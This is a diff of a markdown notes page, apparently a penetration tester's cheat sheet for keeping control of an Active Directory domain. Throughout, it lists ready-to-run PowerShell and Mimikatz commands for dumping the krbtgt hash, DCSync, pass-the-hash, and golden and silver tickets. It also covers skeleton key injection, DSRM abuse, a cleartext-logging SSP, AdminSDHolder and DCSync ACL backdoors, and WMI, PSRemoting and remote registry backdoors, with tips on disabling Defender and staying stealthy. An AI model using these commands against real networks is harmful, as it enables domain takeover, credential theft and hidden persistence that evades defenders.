@@ -46,30 +46,48 @@ PowerView: (Get-DomainPolicy)."Kerberos Policy"
 
 ### Tools
 
-**Execute Mimikatz on DC to get krbtgt hash - required DA privs**\
+**Execute Mimikatz on DC to get krbtgt hash - required DA privs**
+
+{% code overflow="wrap" %}
+```powershell
 Invoke-Mimikatz -command '"lsadump:lsa /patch" -computername dc-hostname
+ With powershell session on dc:
+$sess = New-Session -Computername dc.local
+Disable AMSI/Defender in that session
+Exit
+Invoke-command -session $ses -filepath C:\invoke-mimikatz.ps1
+Enter-Pssession  -session $sess
+Invoke-Mimikatz -command '"lsadump:lsa /patch
+```
+{% endcode %}
 
-&#x20;With powershell session on dc:\
-$sess = New-Session -Computername dc.local\
-Disable AMSI/Defender in that session\
-Exit\
-Invoke-command -session $ses -filepath C:\invoke-mimikatz.ps1\
-Enter-Pssession  -session $sess\
-Invoke-Mimikatz -command '"lsadump:lsa /patch\
 
 
-**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**\
+**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**
+
+{% code overflow="wrap" %}
+```powershell
 Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'
+```
+{% endcode %}
 
-**Overpass the hash to start powershell**\
+**Overpass the hash to start powershell**
+
+{% code overflow="wrap" %}
+```powershell
 Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:hash /run:powershell.exe"'
+```
+{% endcode %}
 
+**Create a golden ticket when we have the krbtgt hash extracted from above**&#x20;
 
+{% code overflow="wrap" %}
+```powershell
+Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
+{% endcode %}
 
-**Create a golden ticket when we have the krbtgt hash extracted from above** \
-****Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
-
-<figure><img src=".gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -94,8 +112,13 @@ Machine account hash (e.g. after krbtgt&#x20;
 
 ### Tools
 
-**Get domain controller account hash**\
+**Get domain controller account hash**
+
+{% code overflow="wrap" %}
+```powershell
 Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:cifs /rc4:hash /user:Administrator /ptt"'
+```
+{% endcode %}
 
 <figure><img src=".gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -141,8 +164,13 @@ schtasks /Run /S hostname.dom.local /TN "STCheck"
 
 ### Tools
 
-**Inject a skeleton key, password will be mimikatz - DA rights required**\
+**Inject a skeleton key, password will be mimikatz - DA rights required**
+
+{% code overflow="wrap" %}
+```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local
+```
+{% endcode %}
 
 Now you can login e.g. with Enter-PSSession
 
@@ -181,12 +209,23 @@ Noisy in logs - Service Installation for a kernel mode driver will be displayed
 
 ### Tools
 
-**Dump DSRM password - needs DA privs**\
-Invoke-Mimikatz - Command '"token::elevate" "lsadump::sam"' -computername dchostname.dc.local\
+**Dump DSRM password - needs DA privs**
+
+{% code overflow="wrap" %}
+```powershell
+Invoke-Mimikatz - Command '"token::elevate" "lsadump::sam"' -computername dchostname.dc.local
+```
+{% endcode %}
+
 \=> Here we take it from SAM hive (only local users), this is the DSRM local Administrator Password
 
-Compare the Administrator hash with the Administrator hash of the below command\
-Invoke-Mimikatz - Command '"lsadump:lsa /patch"' -computername dchostname.dc.local\
+Compare the Administrator hash with the Administrator hash of the below command
+
+```powershell
+Invoke-Mimikatz - Command '"lsadump:lsa /patch"' -computername dchostname.dc.local
+```
+
+\
 \=> Here we that it from the lsass process => This is the Administrator account of the Domain
 
 **Change the logon behaviour of the DSRM Account before we can use the DSRM Hash**
@@ -201,9 +240,17 @@ Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
 
 
 
-**Later we can us the following command to get DA back**\
-****Invoke-Mimikatz -command '"sekurlsa::pth /domain:!domaincontroller-name-here! /user:Administrator /ntlm:ntlm-hash-of-dsrm /run:powershell.exe\
-ls \\\dc\c$
+**Later we can us the following command to get DA back**
+
+{% code overflow="wrap" %}
+```powershell
+Invoke-Mimikatz -command '"sekurlsa::pth /domain:!domaincontroller-name-here! /user:Administrator /ntlm:ntlm-hash-of-dsrm /run:powershell.exe
+
+ls \\dc\c$
+```
+{% endcode %}
+
+
 
 ## 🐶Custom Security Support Provider (SSP)
 
@@ -212,8 +259,6 @@ ls \\\dc\c$
 * SSP is a DLL which provides ways fot an application to obtain an authenticated connection. Examples from SSP provided by Microsoft: NTLM, Kerberost, Wdigest, CredSSP
 * Mimikatz provides custom SSP - mimilib.dll - This logs local logons, service account and machine account passwords in clear text on the targer server
 
-
-
 ### Requirement
 
 * DA requires
@@ -221,19 +266,30 @@ ls \\\dc\c$
 ### Tools
 
 **Way1: Drop the mimilib.dll to C:\Windows\System32 an add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages**\
-$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' | select -expandproperty 'security packages'\
-$packages += "mimilib"\
-Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' -value $packages\
-Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -name 'Security Packages' -value $packages\
-Reboot the server\
-All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 
-**Way2: Using mimikatz, inject into lsass (not stable with Server 2016/sometimes it works) / injects into lsass** \
-Invoke-Mimikatz -command '"misc::memssp"'\
-No reboot required\
-All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 
-**mimilib.dll can be edited that the output is written in any directory e.g. SYSVOL or similar**
+{% code overflow="wrap" %}
+```powershell
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' | select -expandproperty 'security packages'
+$packages += "mimilib"
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' -value $packages
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -name 'Security Packages' -value $packages
+Reboot the server
+All logons on the DC are logged to C:\Windows\system32\kiwissp.log
+```
+{% endcode %}
+
+**Way2: Using mimikatz, inject into lsass (not stable with Server 2016/sometimes it works) / injects into lsass**&#x20;
+
+{% code overflow="wrap" %}
+```powershell
+Invoke-Mimikatz -command '"misc::memssp"'
+No reboot required
+All logons on the DC are logged to C:\Windows\system32\kiwissp.log
+```
+{% endcode %}
+
+**❗**mimilib.dll can/should be edited that the output is written in any directory e.g. SYSVOL or similar
 
 ## 🔑ACLs - AdminSDHolder
 
@@ -260,43 +316,87 @@ All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 ****Modify the Permissions of AdminSDholder and add your Account as member via GUI or remotly
 
 Add FullControl permissions for a user to the AdminSDHolder using PowerView as DomainAdmin:\
+
+
+{% code overflow="wrap" %}
+```powershell
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName yourusername -Rigths All -verbose
+```
+{% endcode %}
 
 Using ActiveDirectory Moduel and Set-ADACL:\
+
+
+{% code overflow="wrap" %}
+```powershell
 Set-ADACL -DistinguisedName 'CN=AdminSDHolder,CN=System,DC=subdom,DC=dom,DC=local' -Principal yourusername -verbose
+```
+{% endcode %}
 
-Do the propagtion:\
-$sess = NewPsSession -computername dchostn.local\
-Invoke-Command -filepath .\Invoke-SDPropagator.ps -sessoin $sess\
-Enter-pssession -sesion $sess\
+Do the propagtion:
+
+{% code overflow="wrap" %}
+```powershell
+$sess = NewPsSession -computername dchostn.local
+Invoke-Command -filepath .\Invoke-SDPropagator.ps -sessoin $sess
+Enter-pssession -sesion $sess
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+```
+{% endcode %}
 
-**Get ACL of an Object for a specific user**\
-****. .\PowerView.ps1\
-Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDS | ?{$\_.IdentityReference -atch 'username'}\
+
+
+**Get ACL of an Object for a specific user**
+
+{% code overflow="wrap" %}
+```powershell
+. .\PowerView.ps1
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDS | ?{$_.IdentityReference -atch 'username'}
+
+(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=subdom,DC=dom,DC=local').Access | ?{$_.IdentityReference -match 'username'} 
+```
+{% endcode %}
+
 \==> ActiveDirectoryRights: GenericAll => so you have full rights to domain
 
-Using AD Module\
-(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=subdom,DC=dom,DC=local').Access | ?{$\_.IdentityReference -match 'username'}&#x20;
+Using AD Module
 
-**Add Member to Domain Group**\
-. .\PowerView\_dev.ps1\
+**Add Member to Domain Group**
+
+{% code overflow="wrap" %}
+```powershell
+. .\PowerView_dev.ps1
 Add-DomainGroupMember -identity 'domain admins' -members yourusername -verbose
 
-Using AD Module\
+Using AD Module
 Add-ADGroupMember -identity 'domain admins' -members yourusername -verbose
+```
+{% endcode %}
 
-**ResetPassword using PowerView\_dev**\
-Set-DomainUserPassword -identity yourusername -accountpassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose\
-\
-Using AD Module\
+
+
+**ResetPassword using PowerView\_dev**
+
+{% code overflow="wrap" %}
+```powershell
+Set-DomainUserPassword -identity yourusername -accountpassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose
+
+Using AD Module
 Set-ADAccountPassword -Identity yourusername -newPassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose
+```
+{% endcode %}
 
-**Run SDpropgator to apply the AdminSDHolder on all the Protected Groups**\
-****. .\Invoke-SDPropagator\
+**Run SDpropgator to apply the AdminSDHolder on all the Protected Groups**
+
+{% code overflow="wrap" %}
+```powershell
+. .\Invoke-SDPropagator
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
-
 ❗Remember to add your user to other protected groups to be stealthier
+```
+{% endcode %}
+
+
 
 ## 🔑ACL - Right Abuse / DCSync&#x20;
 
@@ -311,17 +411,29 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 
 ### Tools
 
-**Add FullControl rights to Domain Object**\
+**Add FullControl rights to Domain Object**
+
+{% code overflow="wrap" %}
+```powershell
 Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights All -verbose
 
-Using AD Module\
+Using AD Module
 Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourusername -verbose
+```
+{% endcode %}
 
-**Add DCSync rights**\
-****Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights DCSync -verbose
 
-Using AD Module\
+
+**Add DCSync rights**
+
+{% code overflow="wrap" %}
+```powershell
+Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights DCSync -verbose
+
+Using AD Module
 Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourusername -GUIDRight DCSync -verbose
+```
+{% endcode %}
 
 In the GUI they are called Replicating Directory Changes, Replicating Direcotry Changes All, Replicating Directory Changes In Filtered Set => All three are needed for DCSync
 
@@ -362,53 +474,114 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'\
 1. On DC start application "Component Services"/Computers/My Computer/Properties/COM Security/Add your User
 2. WMI Namespace Permissions: On DC start Computer Management/Services and Applications/WMI Control/Properties/Security/Root Security/Advanced permissions / Applies to this namespace and subnamspaces!
 
-**List WMI Information from DC**\
-Get-WmiObject -class win32\_operatingsystem -computername dcname.dc.local\
+**List WMI Information from DC**
+
+{% code overflow="wrap" %}
+```powershell
+Get-WmiObject -class win32_operatingsystem -computername dcname.dc.local
 Execute commands via WMI now possible
+```
+{% endcode %}
 
-**Modify WMI ACL to allow non-admin users access to securable objects**\
-On Local machine for user1 on all WMI namespaces and DCOM\
+**Modify WMI ACL to allow non-admin users access to securable objects**
+
+{% code overflow="wrap" %}
+```powershell
+On Local machine for user1 on all WMI namespaces and DCOM
 Set-RemoteWMI -Username user1 -verbose
+```
+{% endcode %}
 
-**On remote machine for user1 only for root\cimv2 namespace without explicit credentials**\
+**On remote machine for user1 only for root\cimv2 namespace without explicit credentials**
+
+{% code overflow="wrap" %}
+```powershell
 Set-RemoteWMI -Username user1 -computername hostname -namespace 'root\cimv2' -verbose
+```
+{% endcode %}
 
-**On remote machine with explicit credentials. Only root\cimv2 and nested namespaces**\
+**On remote machine with explicit credentials. Only root\cimv2 and nested namespaces**
+
+{% code overflow="wrap" %}
+```powershell
 Set-RemoteWMI -Username user1 -computername hostname -credential administrator -namespace 'root\cimv2' -verbose
+```
+{% endcode %}
 
-**On remote machine remove permissions**\
+**O remote machine remove permissions**
+
+{% code overflow="wrap" %}
+```powershell
 Set-RemoteWMI -Username user1 -computername hostname -namespace 'root\cimv2' -remove -verbose
-
 Invoke-Command -scriptblock{whoami} -computername dchost.dc.local => Does not work, because no DA privs, but only WMI Privs
+```
+{% endcode %}
 
-**PSRemoting: On local machine for user1**\
+**PSRemoting: On local machine for user1**
+
+{% code overflow="wrap" %}
+```powershell
 Set-RemotePSRemoting -username user1 -verbose
+```
+{% endcode %}
 
-**PSRemoting: On remote machine for user1 without credentials**\
-Set-RemotePSRemoting -username user1 -computername targethost.dom.local -verbose\
+**PSRemoting: On remote machine for user1 without credentials**
 
-
+{% code overflow="wrap" %}
+```powershell
+Set-RemotePSRemoting -username user1 -computername targethost.dom.local -verbose
 Invoke-Command -scriptblock{whoami} -computername dchost.dc.local => Works
+```
+{% endcode %}
 
-**PSRemoting: On remote machine remove user1** \
+**PSRemoting: On remote machine remove user1**&#x20;
+
+{% code overflow="wrap" %}
+```powershell
 Set-RemotePSRemoting -username user1 -computername argethost.dom.local -remove
+```
+{% endcode %}
 
 **Using DAMP toolkit:**\
 **1.Remote Registry: Start using DAMP with domain admin privs on remote host**\
+
+
+{% code overflow="wrap" %}
+```powershell
 Add-RemoteRegBackdoor -computername dchostname -Trustee username -verbose
-
 . .\RemoteHashRetrieval.ps1 (maybe replace $IV with $InitV) when there are errors with the following commands
+```
+{% endcode %}
 
-**2.Remote Registry: Retrieve machine account hash, as regular user**\
+**2.Remote Registry: Retrieve machine account hash, as regular user**
+
+{% code overflow="wrap" %}
+```powershell
 Get-RemoteMachineAccountHash -computername dcname -verbose
+```
+{% endcode %}
 
-**2.Remote Registry: Retrieve local account hash, as regular user**\
+**2.Remote Registry: Retrieve local account hash, as regular user**
+
+{% code overflow="wrap" %}
+```powershell
 Get-RemoteLocaltAccountHash -computername dcname -verbose
+```
+{% endcode %}
 
 \=> DSRM account on DC
 
-**2.Remote Registry: Retrieve domain cached credentials, as regular user**\
+**2.Remote Registry: Retrieve domain cached credentials, as regular user**
+
+{% code overflow="wrap" %}
+```powershell
 Get-RemoteCachedCredential -computername dcnmae -verbose
+```
+{% endcode %}
+
+
+
+
 
 
 
